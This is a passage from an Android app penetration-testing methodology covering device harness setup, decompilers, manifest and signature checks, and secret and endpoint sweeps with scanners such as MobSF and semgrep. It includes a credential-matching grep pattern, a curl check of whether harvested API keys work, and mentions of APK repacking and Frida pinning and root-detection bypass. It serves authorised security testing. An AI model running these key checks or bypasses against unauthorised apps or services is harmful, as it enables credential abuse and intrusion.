- **Test:** Two-device evidence (attacker phone + victim phone) needs the USB port free and a second
  device recording. On Android 11+, wireless debugging is usually the only workable path.
- **How:**
  ```bash
  # On device: Developer options > Wireless debugging > Pair device with pairing code
  adb pair 192.168.1.50:41234      # PAIRING port + the 6-digit code shown on the device
  adb connect 192.168.1.50:5555    # CONNECT port from the Wireless debugging screen — a DIFFERENT port
  adb devices -l                   # drive with: adb -s 192.168.1.50:5555 ...
  # proxy a real handset (no 10.0.2.2 on hardware — use the host's LAN IP)
  adb -s 192.168.1.50:5555 shell settings put global http_proxy 192.168.1.10:8080
  # teardown
  adb -s 192.168.1.50:5555 shell settings delete global http_proxy
  adb -s 192.168.1.50:5555 shell settings delete global global_http_proxy_host
  adb -s 192.168.1.50:5555 shell settings delete global global_http_proxy_port
  scrcpy --record poc.mp4          # host-side mirror + capture
  ```
  The usual failure is using the **pairing** port for `connect`; it reports as a generic connection
  refusal, not as a port error. Hosts also commonly fail to resolve the `.local` mDNS name — use the IP.
- **Proof:** `adb devices -l` listing the handset by `host:port`, and the proxy showing that handset's
  flows.
- **Escalation:** The handset is the honest device for every row the emulator cannot answer (D26-014), and
  it produces production-equivalent evidence, which is the rung of the triage ladder that converts
  "requires root/adb" dismissals (-> D27).
- **Ruled out when:** Not a finding. A connection failure after a correct `pair` + `connect` with the right
  ports is a network or developer-options problem, never a target observation.

### D26-014 · Publish the device-capability matrix — decide up front what the emulator cannot answer

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — its purpose is to stop you filing emulator artefacts as findings |
| **Attacker** | AM-12 |
| **Applies to** | all; decisive for fintech, wallet, identity, health and automotive apps |
| **Maps to** | Play Integrity verdict behaviour on rooted/unsupported emulators (empty verdict); AOSP keystore attestation `SecurityLevel` semantics |

- **Test:** State, before testing, which classes the emulator cannot authoritatively answer, so those rows
  become priced options rather than silent gaps or false findings.
- **How:** Publish this matrix in the methodology section and mark each row *covered* / *not covered — no
  hardware*:
  ```
  Emulator CANNOT authoritatively answer:
    - hardware-backed key attestation / StrongBox (isInsideSecureHardware, SecurityLevel, attestation chain)
    - real biometric enrolment and BiometricPrompt CryptoObject binding to a hardware key
    - Play Integrity device verdicts on a certified device (rooted/emulated => empty verdict)
    - NFC / HCE payment flows, SE / eSE, StrongBox-backed payment credentials
    - OEM preinstalled-app and vendor-sepolicy interactions (Samsung/Xiaomi/Honor surfaces)
    - telephony: real SMS delivery, SIM/eSIM, carrier services, RCS
    - sensor-derived anti-fraud signals; camera/mic hardware behaviours
    - Wear OS / Android Auto / TV companion transports on real paired hardware
    - performance-sensitive races whose timing differs from QEMU
  Emulator IS authoritative for:
    - IPC, intents, providers, deep links, WebView, storage, network, most business logic, most crypto misuse
  ```
  ```bash
  adb shell pm list features | grep -E 'strongbox|fingerprint|face|hardware_keystore'
  adb shell getprop ro.kernel.qemu; adb shell getenforce
  ```
- **Proof:** Each "not covered" row appears in the ruled-out register as *out of scope — hardware not
  provisioned*, with the cost of adding it quoted at Gate 1.
- **Escalation:** If any scoped feature falls in the top list, a physical-device lane (D26-013) is not
  optional. Quote it at kickoff rather than discovering it on day six.
- **Ruled out when:** Not a finding. Its inverse **is** a common false positive:
  `isInsideSecureHardware() == false` on a standard AVD is a software-backed keystore artefact and must
  never be reported (-> Graveyard).

### D26-015 · Per-engagement clean device state, and the target-state restoration inventory

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | AM-12 |
| **Applies to** | all engagements; the restoration half applies to any live or shared environment |
| **Maps to** | NIST SP 800-115 Appendix B §5.2 (required actions for files created to facilitate testing), §5.3 (Data Handling) |

- **Test:** Engagement N+1 must not run on a device still carrying engagement N's attacker APKs, hooks, CA
  binds, accounts and `settings` overrides — that is both a confidentiality problem and a correctness one
  (a leftover attacker app registering the same intent filter changes the target's behaviour).
- **How:**
  ```bash
  S=emulator-5554
  # START: prove the device is clean and record what is on it
  adb -s $S shell pm list packages -3 | sort | tee lab/third-party-packages-before.txt
  adb -s $S shell settings list global | grep -i proxy
  adb -s $S shell ls /data/local/tmp
  # END: remove everything you introduced, in this order
  for p in $(comm -13 lab/third-party-packages-before.txt \
             <(adb -s $S shell pm list packages -3 | sort)); do
    adb -s $S uninstall "${p#package:}"; done
  adb -s $S shell rm -f /data/local/tmp/frida-server /data/local/tmp/*.0
  adb -s $S shell rm -rf /data/local/tmp/cacerts
  adb -s $S shell settings delete global http_proxy
  adb -s $S uninstall com.target.app
  adb -s $S emu kill        # research AVD is destroyed and rebuilt from LAB-MANIFEST.txt
  ```
  Alongside it, maintain `engagement/CREATED-STATE.tsv` for everything you created on the **client's**
  systems, one row per artefact — accounts, uploaded files, webhook registrations, FCM device tokens,
  OAuth grants, payment tokens, support tickets:
  ```
  timestamp   system    object_type    identifier          created_by  removal_action  removed_at
  2026-09-03  backend   user           a5@test.tld         tester      client ticket   2026-09-12
  2026-09-04  FCM       device token   fcm:dGhpc...        tester      unregister      2026-09-12
  2026-09-06  OAuth     grant          client_id=poc-app   tester      revoke          2026-09-11
  ```
- **Proof:** A `third-party-packages-after.txt` matching the before file, and a closed-out `CREATED-STATE.tsv`
  appended to the report. Anything still `pending` at delivery goes in the report as an open action with a
  named owner.
- **Escalation:** -> D27. The TSV is also what defends you when the client later finds an anomalous record
  and asks whether it was the pentest.
- **Ruled out when:** Not a finding. A physical device's end state is a factory reset; for AVDs it is
  delete-and-recreate.

### D26-016 · Clock discipline across host, device and proxy, or the evidence does not correlate

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | AM-12 |
| **Applies to** | all multi-stream evidence; mandatory for anything timing-dependent |
| **Maps to** | `logcat -v year -v UTC -v threadtime`; `settings get global auto_time`; MASTG-TECH-0009 (Monitoring System Logs) |

- **Test:** A finding's proof is usually three streams that must line up — screen recording, `logcat`, and
  the proxy's flows. An emulator with a drifted clock or a proxy logging in another zone makes them
  un-correlatable, and a reviewer cannot distinguish a genuine sequence from a rearranged one.
- **How:**
  ```bash
  S=emulator-5554
  date -u +%FT%T.%3NZ                                # host
  adb -s $S shell date -u +%FT%T.%3NZ                # device (must be within ~2s of host)
  adb -s $S shell settings get global auto_time      # 1 = network time; 0 = drifting, fix it
  adb -s $S shell su 0 date -u 010112002026.00 2>/dev/null || true
  # force logcat into a comparable format for the WHOLE engagement:
  adb -s $S logcat -v year -v UTC -v threadtime > evidence/F-007/logcat.txt
  printf 'host=%s device=%s\n' "$(date -u +%FT%T.%3NZ)" \
    "$(adb -s $S shell date -u +%FT%T.%3NZ)" > evidence/F-007/clock.txt
  ```
  `-v year -v UTC` is the load-bearing part: the default logcat format carries neither a year nor a zone,
  which is precisely what makes cross-stream correlation arguable months later at retest.
- **Proof:** `clock.txt` next to each multi-stream capture, and logcat lines with a full UTC timestamp
  bracketing the corresponding proxy flow.
- **Escalation:** -> D27. Put the measured offset in the report wherever a finding's argument depends on
  ordering (races, TOCTOU, callback ordering).
- **Ruled out when:** Not a finding. A single-stream claim (one HTTP request/response pair) does not need
  it; anything with two or more streams does.

### D26-017 · Keep a symptom-keyed harness failure runbook

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | AM-12 |
| **Applies to** | all |
| **Maps to** | `INSTALL_FAILED_DEPRECATED_SDK_VERSION` and `--bypass-low-target-sdk-block` (Android 14 behaviour changes); `ERR_PROXY_CONNECTION_FAILED`; `adbd cannot run as root in production builds` |

- **Test:** Index the traps by **the observable the tester actually sees**, so a junior tester resolves in
  minutes what a senior once lost hours to. Put it in `lab/README.md`.
- **How:**
  ```
  SYMPTOM (what you see)                                       FIRST CHECK                          LIKELY CAUSE
  "TLS handshake failed ... does not trust" on EVERY host       verify-harness control-app line      CA bind never reached zygote's mount ns (D26-005)
  the same, on ONE host only                                    which host                           that host is pinned -> objection/Frida (D14)
  frida-ps -U empty / attach hangs                              frida --version vs server --version  version or ABI mismatch (D26-010)
  Frida script loads, zero events                               fire the Log.i control hook          abstract class / R8-renamed / init-time path
  frida-trace "Started tracing 0 functions"                     retry attached with -p               classes not loaded at spawn (D26-047)
  adb root -> "cannot run as root in production builds"         image variant                        *_playstore image: never rootable (D26-003)
  emulator hangs at "QEMU2 main loop"                           image variant on Apple Silicon       needs a ps16k (16 KB page) image
  INSTALL_FAILED_DEPRECATED_SDK_VERSION                         target's minSdk                      Android 14 min targetSdk 23 -> --bypass-low-target-sdk-block
  INSTALL_FAILED_MISSING_SPLIT                                  pm path count                        base only installed; use install-multiple / bundletool
  WebView ERR_PROXY_CONNECTION_FAILED                           settings get global http_proxy       stale proxy -> settings delete global http_proxy
  proxy sees nothing at all                                     proxy setting + route                emulator 10.0.2.2 vs hardware host LAN IP
  tool prints zero exported components                          read the manifest/code               API 31+ default: silence is not a negative
  key generation throws on a fresh emulator                     locksettings set-pin                 setUserAuthenticationRequired needs a credential
  isInsideSecureHardware() == false                             device type                          emulator keystore is software-backed — NOT a finding
  two-device screenrecord short/corrupt                         capture stills instead               simultaneous screenrecord is fragile
  ```
  Host-side traps worth the same treatment (macOS/Apple Silicon): macOS has **no `timeout`** (use
  `gtimeout`); `UID` is a **readonly** bash variable, so `UID=$(...)` fails silently under `set +e` and
  `$UID` then expands to the host user id (501), putting a plausible-but-wrong value in your evidence —
  the same trap applies to `PPID`, `EUID`, `RANDOM`; a freshly-created system-image directory containing
  only `.installer/.installData` is **not** an installed image (check for `system.img` + `package.xml`);
  buffered stdout hides success (`python3 -u`); macOS LibreSSL has no `openssl zlib`, whose failure reads
  like a corrupt archive.
- **Proof:** The table exists and every FIRST CHECK is a command a tester can run.
- **Escalation:** Every new trap discovered in an engagement is added at the closing gate — this is the
  lessons-learned loop made concrete.
- **Ruled out when:** Not a finding. A symptom not in the table is a research task, not a target
  observation, until the FIRST CHECK column has been exhausted.

### D26-018 · Pull the complete split set before any static tool runs

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — but missing a split causes false negatives on every P1 in D04–D09 and D16 |
| **Attacker** | AM-12 |
| **Applies to** | all AAB-distributed apps; XAPK is an APKPure/APKMirror packaging convention, not an Android standard |
| **Maps to** | MASTG-TECH-0003 (Obtaining and Extracting Apps), MASTG-TECH-0145 (Working with XAPK Files), MASTG-TECH-0007 (Exploring the App Package), MASTG-TOOL-0004 (adb), MASTG-TOOL-0018 (jadx), MASTG-TOOL-0148 (apkeep) |

- **Test:** Apps shipped as an AAB install as `base.apk` plus `config.*.apk` splits. Manifest entries,
  native libraries and whole feature modules live only in splits. Analysing `base.apk` alone silently
  drops attack surface — an exported activity declared in a feature split is just as reachable.
- **How:**
  ```bash
  PKG=com.target.app
  adb shell pm path $PKG                       # more than one "package:" line = split app
  mkdir -p apk && for p in $(adb shell pm path $PKG | sed 's/package://' | tr -d '\r'); do
    adb pull "$p" apk/; done
  ls -1 apk/                                   # base.apk config.arm64_v8a.apk config.xxxhdpi.apk ...
  unzip app.xapk -d apk_extracted              # XAPK is a plain ZIP
  jadx -d out apk/*.apk                        # open base + every split together
  adb install-multiple -r apk/*.apk            # reinstall elsewhere with the same key set
  ```
- **Proof:** `pm path` returning more than one line, and jadx over the full set resolving classes or
  manifest entries that are absent from `base.apk` alone.
- **Escalation:** -> D01 inventory, D03 manifest, D04–D07 components, D16 native libraries, D19
  cross-platform bundles.
- **Ruled out when:** `pm path` returns exactly one line — a genuinely single-APK app. Note the reverse
  failure mode: `INSTALL_FAILED_MISSING_SPLIT` on reinstall means you installed the base only.

### D26-019 · jadx: the flags that matter, and the two-decompiler cross-check rule

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | AM-12 |
| **Applies to** | all DEX-bearing apps |
| **Maps to** | MASTG-TECH-0017 (Decompiling Java Code), MASTG-TECH-0013 (Reverse Engineering Android Apps), MASTG-TECH-0023 (Reviewing Decompiled Java Code), MASTG-TOOL-0018 (jadx), MASTG-TOOL-0014 (Bytecode Viewer), MASTG-TOOL-0012 (apkx) |

- **Test:** Decompile once, keep the output for the whole engagement, and never treat a single tool's
  failure as evidence the code is unreadable.
- **How:**
  ```bash
  jadx -d out app.apk                                   # full decompile
  jadx --no-src -d out app.apk                          # resources + manifest only (fast first pass)
  jadx -d out --show-bad-code app.apk                   # keep methods jadx could not fully decompile
  jadx -d out --deobf --deobf-min 3 --deobf-max 64 \
       --deobf-parse-kotlin-metadata -j 4 app.apk       # consistent names across an obfuscated build
  jadx -d out --cfg app.apk                             # control-flow graphs (.dot)
  # cross-check when jadx chokes on a class:
  d2j-dex2jar.sh classes.dex && open classes-dex2jar.jar   # then JD-GUI / CFR / Procyon / Fernflower
  androguard decompile -o out2 -f png -i app.apk --limit "^Lcom/target/.*"
  androguard cg -o callgraph.gml --classname "^Lcom/target/.*" app.apk
  ```
- **Proof:** Readable code for the class the first tool failed on, and — where you base a finding on a
  method body — the same body recovered by two independent decompilers.
- **Escalation:** Disagreement between tools on the file list or the manifest is the malformed-container
  signal (-> D01, D02). The call graph is what supplies the reachability argument from an exported entry
  point to a sink (-> D04, D10, D16).
- **Ruled out when:** Two decompilers agree on the method body you are quoting. "jadx showed nothing" is
  never a negative: `--show-bad-code` off by default hides exactly the methods an obfuscator mangled, and
  a class living in a secondary dex or loaded at runtime never appears at all (-> D26-048, D17).

### D26-020 · apktool: `-s`, `-r`, `--force-manifest`, and the `<uses-sdk>` that it drops

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | AM-12 |
| **Applies to** | all |
| **Maps to** | MASTG-TECH-0016 (Disassembling Code to Smali), MASTG-TECH-0038 (Patching), MASTG-TOOL-0011 (Apktool), MASTG-TOOL-0010 (APKLab) |

- **Test:** Use apktool for the decoded manifest, the resources and the smali patch loop — and know the
  one thing it silently loses.
- **How:**
  ```bash
  apktool d -s -f -o out_res app.apk        # -s skips baksmali: fast, for manifest + resources only
  apktool d -f -o out_smali app.apk         # full smali, for the patch loop
  apktool d -r app.apk                      # skip resource decoding when broken resources kill the decode
  apktool d -r app.apk --force-manifest     # still decode AndroidManifest.xml in that case
  # THE TRAP: apktool frequently DROPS <uses-sdk> from the decoded manifest.
  grep -E 'minSdkVersion|targetSdkVersion' out_res/apktool.yml      # authoritative
  grep -E 'uses-sdk' out_res/AndroidManifest.xml                    # often absent — do not trust it
  # rebuild + sign loop
  apktool b -o patched.apk out_smali
  zipalign -p -f 4 patched.apk aligned.apk
  apksigner sign --ks my.keystore aligned.apk
  ```
- **Proof:** `apktool.yml` carrying the SDK integers, cross-checked against `aapt2 dump badging` and
  `dumpsys package` (D26-021). A smali patch that rebuilds, aligns, signs and installs.
- **Escalation:** -> D22, where the SDK triplet decides the applicability of roughly sixty items; -> D26-008
  and D26-009 for the NSC/gadget repack loops.
- **Ruled out when:** Three sources agree on `minSdkVersion`/`targetSdkVersion`. Reading the SDK levels
  from the apktool-decoded manifest alone is the single most common way a chapter's API gate is set wrong.

### D26-021 · aapt2 `dump badging` / `dump xmltree` as the manifest ground truth

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | AM-12 |
| **Applies to** | all |
| **Maps to** | MASTG-TOOL-0124 (aapt2), MASTG-TECH-0117 (Obtaining Information from the AndroidManifest), MASTG-TECH-0141 (Inspecting the Merged AndroidManifest), MASTG-TECH-0150 (Analyzing the AndroidManifest), MASTG-TECH-0126 (Obtaining App Permissions) |

- **Test:** Read identity, SDK levels, permissions and manifest attributes from the binary manifest rather
  than from a decoded copy, and reconcile with the package manager's view of the installed app.
- **How:**
  ```bash
  aapt2 dump badging base.apk | grep -E "package: name|sdkVersion:|targetSdkVersion:|uses-permission|uses-feature"
  aapt2 dump badging base.apk | grep -i debuggable
  aapt2 dump xmltree base.apk --file AndroidManifest.xml | \
    grep -iE 'exported|permission|networkSecurityConfig|allowBackup|usesCleartextTraffic|testOnly'
  aapt dump permissions poc.apk                      # for YOUR attacker app — see D26-066
  apkanalyzer manifest print base.apk > AndroidManifest.merged.xml   # the MERGED manifest
  adb shell dumpsys package com.target.app | grep -E 'targetSdk|minSdk|versionName|versionCode|flags=|pkgFlags'
  ```
- **Proof:** The identity block every accepted HackerOne mobile report opens with — package name, version
  code, version name, minSdk, targetSdk and the base APK's SHA-256 — with the three sources agreeing.
- **Escalation:** -> D03 manifest and permissions, D22 version gating, D02 binary identity.
- **Ruled out when:** The values agree across `aapt2 dump badging`, `apktool.yml` and `dumpsys package`.
  The app's *effective* posture is the **merged** manifest, not its own source manifest — a component
  contributed by an SDK is still the app's attack surface.

### D26-022 · `apksigner verify --print-certs`: signer identity and which schemes actually cover the file

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none in this chapter; the consumer is D02/D17 |
| **Attacker** | AM-12 |
| **Applies to** | all |
| **Maps to** | MASTG-TOOL-0123 (apksigner), MASTG-TECH-0039 (Repackaging & Re-Signing) |

- **Test:** Establish who signed the artefact you are analysing, and prove it is the same artefact the
  store ships — before any finding is attributed to "the app".
- **How:**
  ```bash
  apksigner verify --print-certs --verbose apk/base.apk
  apksigner verify --print-certs apk/base.apk | grep -i 'signer #1 certificate SHA-256'
  # compare against the store build, and against the previous release:
  apksigner verify --print-certs store/base.apk | grep -i 'SHA-256'
  apksigner verify --print-certs old/base.apk   | grep -i 'SHA-256'   # MUST match the current cert
  sha256sum apk/base.apk
  ```
- **Proof:** A signer certificate SHA-256 that matches the store artefact, plus the verbose output naming
  which signature schemes (v1/v2/v3/v4) verified. Record it next to the identity block from D26-021.
- **Escalation:** A signer mismatch between the client-supplied build and the store build means you are
  analysing a different app (-> D02). Record `apksigner verify --print-certs` output for any artefact you
  claim is *the release build*.
- **Ruled out when:** The certificate digest matches the store build. Note the inverse for your own work:
  after any repack (D26-008, D26-009) this output will differ by design — say so, so triage does not
  attribute behaviour changes to your patch.

### D26-023 · APKiD: fingerprint compiler, obfuscator, packer and anti-analysis before budgeting

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — **"the app is not obfuscated" is never reportable** |
| **Attacker** | AM-12 |
| **Applies to** | all |
| **Maps to** | MASTG-TECH-0165 (Identifying Compilers, Obfuscators, and Packers in Android Apps), MASTG-TOOL-0009 (APKiD), MASTG-TOOL-0146 (RootBeer); ATT&CK T1406, T1406.002 |

- **Test:** Three seconds of fingerprinting tells you whether the next three days are jadx reading or
  snapshot recovery, and it names the exact `.so` implementing the root check you will need to hook.
- **How:**
  ```bash
  apkid target.apk
  ```
  Real output shape (MASTG's worked example against `r2pay-v1.0.apk`):
  ```
  [*] /input/r2pay-v1.0.apk!classes.dex
   |-> anti_vm : Build.TAGS check, possible ro.secure check
   |-> compiler : r8
   |-> obfuscator : unreadable field names, unreadable method names
  [*] ...!lib/arm64-v8a/libnative-lib.so
   |-> obfuscator : Obfuscator-LLVM version unknown (string encryption)
  [*] ...!lib/armeabi-v7a/libtool-checker.so
   |-> anti_root : RootBeer
  ```
- **Proof:** The `anti_root` / `anti_vm` lines naming the specific `.so`. That is your concrete hook target
  for D21 and the module you load in D26-058/D26-059.
- **Escalation:** -> D21 (the named protection library), D19 (packer/runtime identification), D16 (OLLVM
  in a native lib changes the native-review estimate), D17 (a `packer` entry means the shipped DEX is not
  the executed DEX).
- **Ruled out when:** MASTG states it plainly: *"The absence of `obfuscator` or `packer` entries indicates
  the code is not protected by a recognized tool."* That absence is a **budgeting** fact, never a finding —
  `lack_of_binary_hardening.lack_of_obfuscation` is P5.

### D26-024 · apkleaks and apkurlgrep: the secret/endpoint sweep, and the liveness rule that gives it a severity

| | |
|---|---|
| **Severity ceiling** | **Critical** |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the recovered key is honoured by the remote service; `sensitive_data_exposure.sensitive_data_hardcoded.oauth_secret` (P5) when it is only a client secret with no privilege |
| **Attacker** | AM-01 remote no interaction (the APK is public; anyone can extract it) |
| **Applies to** | all |
| **Maps to** | MASTG-TOOL-0125 (Apkleaks), MASTG-TECH-0019 (Retrieving Strings), MASTG-TECH-0022 (Information Gathering - Network Communication), MASTG-TOOL-0144 (gitleaks), MASTG-TOOL-0129 (rabin2) |

- **Test:** Sweep the DEX, native libraries and resources for endpoint and credential-shaped strings,
  including inside third-party SDK code that hand-grepping never reaches — then prove each hit is *live*.
  A key is noise until the service accepts it.
- **How:**
  ```bash
  pip3 install apkleaks
  apkleaks -f apk/base.apk --json -o apkleaks.json
  apkleaks -f apk/base.apk -p custom-rules.json     # {"Internal API host":"https://[a-z0-9.-]+\\.corp\\.example\\.com"}
  apkurlgrep -a apk/base.apk | sort -u > urlgrep.txt   # URLs *and* bare paths like /v3/checkout
  # the sweep that catches what the rule files miss:
  jadx --no-src -d out apk/*.apk
  rg -n -i --no-ignore \
    "api[_-]?key|secret|passw|token|BEGIN (RSA|EC|PRIVATE)|AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{35}" out
  rabin2 -zz apk_extracted/lib/arm64-v8a/*.so | grep -iE 'http|api\.|\.com'
  # THE RULE: every flagged key gets a live request against the vendor's READ api
  curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $KEY" https://vendor.example/v1/me
  ```
  Then diff `urlgrep.txt` against the endpoint list from the Retrofit/OkHttp pass: paths present in one and
  not the other point at a second HTTP stack (Volley, Ktor, a native library, a WebView).
- **Proof:** The JSON report **plus**, for each "secret", a response proving the key is honoured — data
  returned, not a 401. An unusable analytics write key is noise; a key that returns data is the finding.
- **Escalation:** -> D18 (cloud/SDK privilege of the key), D15 (the endpoints it unlocks), D01 (second HTTP
  stack discovered by the path diff).
- **Ruled out when:** Every flagged string returns 401/403 from its service *and* you can name what it is
  (a public Firebase web API key, a Crashlytics ingest token, a Maps key with a package restriction). Record
  the request you sent. "apkleaks found nothing" is not a ruled-out entry; "these eleven strings were tested
  live and all were rejected" is.

### D26-025 · semgrep with the MASTG rule set as a checklist source

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — every hit is a hypothesis routed to another chapter |
| **Attacker** | AM-12 |
| **Applies to** | all |
| **Maps to** | MASTG-TECH-0025 (Automated Static Analysis), MASTG-TECH-0014 (Static Analysis on Android), MASTG-TECH-0108 (Taint Analysis), MASTG-TOOL-0110 (semgrep), MASTG-TOOL-0099 (FlowDroid) |

- **Test:** Run the canonical MASTG rules over the decompiled sources. They are the grep patterns the rest
  of this methodology references, and running them is how you prove the static pass was systematic.
- **How:**
  ```bash
  jadx -d out apk/*.apk
  git clone --depth 1 https://github.com/OWASP/mastg.git
  semgrep -c mastg/rules/ out/sources/ --json -o mastg.json
  # single-rule runs against the exact file each rule targets:
  semgrep -c mastg/rules/mastg-android-network-insecure-trust-anchors.yml out/res/xml/
  semgrep -c mastg/rules/mastg-android-webview-bridges.yml out/sources/
  semgrep -c mastg/rules/mastg-android-pendingintent-mutable.yml out/sources/
  jq -r '.results[] | [.check_id, .path, .start.line] | @tsv' mastg.json | sort -u
  ```
  High-value rule names to run explicitly, each routed to its owning chapter:
  `mastg-android-sdk-version` (D22), `mastg-android-content-provider-exported` and
  `mastg-android-sql-injection-contentprovider` (D07), `mastg-android-fileprovider-root-path`,
  `mastg-android-fileprovider-broad-path-scope`, `mastg-android-fileprovider-broad-scope` (D07),
  `mastg-android-pendingintent-mutable` and `mastg-android-implicit-intent-leaking-extras` (D08),
  `mastg-android-implicit-intent-internal-communication` (D05),
  `mastg-android-deeplink-autoverify-missing`, `mastg-android-deeplink-unvalidated-parameter` (D09),
  `mastg-android-webview-bridges`, `mastg-android-webview-allow-local-access`,
  `mastg-android-webview-url-handlers`, `mastg-android-webview-safebrowsing` (D10),
  `mastg-android-network-insecure-trust-anchors`, `mastg-android-network-checkservertrusted`,
  `mastg-android-network-hostname-verification`, `mastg-android-network-onreceivedsslerror`,
  `mastg-android-ssl-socket-hostnameverifier` (D14),
  `mastg-android-hardcoded-crypto-keys-usage`, `mastg-android-broken-encryption-algorithms`,
  `mastg-android-broken-encryption-modes`, `mastg-android-non-random-use`,
  `mastg-android-random-apis-insufficient-entropy`,
  `mastg-android-key-generation-with-insufficient-key-length`,
  `mastg-android-hardcoded-security-provider` (D12),
  the `mastg-android-biometric-*` family (D13), `mastg-android-object-deserialization` (D17),
  `mastg-android-backup-manifest` and the
  `mastg-android-data-unencrypted-shared-storage-no-user-interaction-*` pair (D11),
  `mastg-android-sensitive-data-in-screenshot`, `mastg-android-sensitive-data-in-notifications*`,
  `mastg-android-keyboard-cache-input-types` (D20), `mastg-android-overlay-protection` and
  `mastg-android-system-alert-window` (D04), `mastg-android-root-detection`,
  `mastg-android-debugger-checks`, `mastg-android-native-debugger-checks` (D21),
  `mastg-android-strictmode` (D22/D26-052).
- **Proof:** A semgrep run over the full rule set with every finding tied to `file:line`, saved in the
  engagement workspace.
- **Escalation:** Each hit routes to its owning chapter's item and is confirmed there by the observable
  that chapter names — never by the rule firing.
- **Ruled out when:** A rule fires and the code read at that `file:line` shows the guard the rule cannot
  see (a permission check inside the provider, an allow-list applied before the bridge call). Record the
  guard. A rule that does **not** fire rules out nothing: R8 renaming, reflection and native code are all
  invisible to it.

### D26-026 · mobsfscan and the mindedsecurity rule set, ranked by impact × confidence

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | AM-12 |
| **Applies to** | all |
| **Maps to** | mobsfscan (MobSF rules + semgrep + libsast); mindedsecurity `semgrep-rules-android-security` (rules carry `confidence`, `likelihood`, `impact` and `verification-level: L1/L2` metadata); MASTG-TECH-0025 |

- **Test:** These two rule sets together encode several hundred of the checks in this methodology. Use
  them to build the worklist, and sort by the metadata that actually predicts impact.
- **How:**
  ```bash
  pip install mobsfscan
  mobsfscan --json -o mobsfscan.json /path/to/decompiled-or-source/
  jadx -d src apk/*.apk
  git clone https://github.com/mindedsecurity/semgrep-rules-android-security
  semgrep --config semgrep-rules-android-security/rules --json -o mindedsec.json src/
  # rank by the metadata that predicts impact, not by rule count:
  jq -r '.results[] | [.extra.metadata.impact, .extra.metadata.confidence, .check_id,
                       .extra.metadata.cwe, .extra.metadata.masvs, .path] | @tsv' mindedsec.json \
    | sort -r | head -40
  ```
  Work `impact: HIGH` + `confidence: HIGH` first. Useful cross-references when writing the finding:
  mobsfscan `webview_javascript_interface`, `webview_allow_file_from_url`, `sqlite_injection`,
  `ignore_ssl_certificate_errors`, `webview_mixed_content`, `android_root_detection`,
  `android_safetynet_api`; mindedsecurity `MSTG-PLATFORM-2_2`, `MSTG-PLATFORM-7_1`, `MSTG-PLATFORM-6_2`.
- **Proof:** A ranked TSV worklist. The output is the worklist; it is never the deliverable.
- **Escalation:** Each row routes to its chapter for the runtime proof named there.
- **Ruled out when:** As for D26-025 — a hit disproved by reading the guard at that line, recorded with the
  guard quoted. Note the inversion trap: MobSF and mobsfscan flag the *absence* of tapjacking protection
  (`android_tapjacking` / `android_detect_tapjacking`), which is a good-practice rule, and
  `mobile_security_misconfiguration.tapjacking` is **P5** — it is only reportable when a security-relevant
  confirmation view accepts obscured touches *and* you demonstrate a working overlay (-> D04).

### D26-027 · MobSF as a coverage net, never as the report

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none. **Submitting raw scanner output is the fastest route to a duplicate-or-N/A on every platform** |
| **Attacker** | AM-12 |
| **Applies to** | all |
| **Maps to** | MASTG-TOOL-0002 (MobSF (Android)), MASTG-TECH-0025 (Automated Static Analysis) |

- **Test:** Run the automated pass to catch what your manual review missed, then verify every hit by hand.
- **How:**
  ```bash
  docker pull opensecurity/mobile-security-framework-mobsf
  docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest
  # http://127.0.0.1:8000  (default credentials mobsf:mobsf)
  # source-tree install:
  python manage.py runserver 127.0.0.1:1337
  ```
- **Proof:** For each MobSF item, an independent manual confirmation — the grep at `file:line`, the `am`
  invocation, the captured request. The scanner's own screenshot is not evidence.
- **Escalation:** Feeds every domain; the exported-component and hardcoded-secret lists are the two
  sections worth reading first.
- **Ruled out when:** You read the code at the flagged line and found the control the rule could not see.
  YesWeHack's own limitations note is the calibration: business-logic flaws stay invisible to it, false
  positives need verification, and *"An exported component may look vulnerable at first glance but still
  enforce the correct permission checks internally."* Equally, a clean MobSF report rules out nothing —
  and on a mature programme the easy findings are already reported, so automated scanning "is useless when
  it is not a fresh program".

### D26-028 · MobSF assisted dynamic analysis, and "Capture String Comparisons"

| | |
|---|---|
| **Severity ceiling** | **High** |
| **VRT** | rated by what the recovered comparison protects — `broken_authentication_and_session_management.authentication_bypass` (P1) for a local PIN/licence gate that the server also honours; P5 if the gate is client-side only |
| **Attacker** | AM-12 for capture; **must be converted** to AM-11 or AM-05 before reporting |
| **Applies to** | apps with a local PIN, passcode, licence or entitlement comparison; Android 5+ for the auto-Frida path |
| **Maps to** | MASTG-TOOL-0002 (MobSF (Android)), MASTG-TECH-0043 (Method Hooking), MASTG-TECH-0042 (Getting Loaded Classes and Methods Dynamically) |

- **Test:** MobSF's dynamic analyser runs a broad first pass while you learn the app. Its most valuable
  single feature is **Capture String Comparisons**, which prints both operands and the boolean result of
  every string comparison — the fastest route to a hardcoded PIN, licence key or entitlement flag.
- **How:**
  ```bash
  docker run -it --rm --name mobsf -p 8000:8000 \
    -e MOBSF_ANALYZER_IDENTIFIER=192.168.255.101:5555 \
    -e MOBSF_DISABLE_AUTHENTICATION=1 opensecurity/mobile-security-framework-mobsf
  ```
  It dumps URLs, logs, clipboard, screenshots, emails, SQLite DBs, XML and other created files; captures
  HTTPS; runs Frida scripts to bypass SSL pinning, root detection and debugger detection; and invokes
  exported activities ("Exported Activity Tester") with a screenshot of each. Auxiliary Frida functions:
